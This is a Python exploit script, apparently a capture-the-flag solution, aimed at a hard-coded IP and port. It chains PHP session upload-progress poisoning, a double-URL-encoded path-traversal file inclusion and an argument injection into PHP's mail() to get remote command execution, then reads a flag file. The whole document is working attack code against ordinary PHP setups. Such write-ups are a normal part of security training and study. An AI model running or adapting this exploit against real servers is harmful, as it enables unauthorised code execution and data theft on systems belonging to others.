import requests
from urllib.parse import quote as urlencode

TARGET = 'http://178.128.174.129:30637/'

SHELL_PAYLOAD = '<?php file_put_contents("/tmp/rce.sh", "/./readflag > /tmp/flag"); ?>'
MAIL_PAYLOAD = '<?php mail("root@localhost", "x", "x", "x", "-H /tmp/rce.sh"); ?>'

SESS_NAME = 'junkid'
SESS_FILE = 'sess_' + SESS_NAME

def write_tmp(payload):
	# SESS_NAME will be the file we will include via LFI to initiate php execution
	phpsessid = {'PHPSESSID': SESS_NAME}

	# The below data is useless, we include this to match the multi-part form data's signature
	junk_file = {'file': b'junk'}

	# Bulk of the arbitrary write
	data = {'PHP_SESSION_UPLOAD_PROGRESS': payload}

	# Trigger the arbitrary write
	requests.post(TARGET, cookies=phpsessid, files=junk_file, data=data)

def lfi_gen(file):
	payload = '../'*12 + '../tmp/' + file
	for _ in range(2):
		payload = urlencode(payload, 'urlencode')
	return TARGET + '/miner/' + payload

def exploit_lfi(file):
	lfi_url = lfi_gen(file)
	r = requests.get(lfi_url)
	return r.text

def main():
	# Write the shell script php code payload to the /tmp directory
	write_tmp(SHELL_PAYLOAD)

	# Exploit LFI to include the shell script payload to write the script to the /tmp directory
	exploit_lfi(SESS_FILE)

	# Write mail php code payload to the /tmp directory
	write_tmp(MAIL_PAYLOAD)

	# Exploit LFI to execute the mail payload to execute the shell script and gain command execution
	exploit_lfi(SESS_FILE)
 
 	# Finally exfiltrate the flag via LFI
	print(exploit_lfi('flag'))

if __name__ == '__main__':
	main()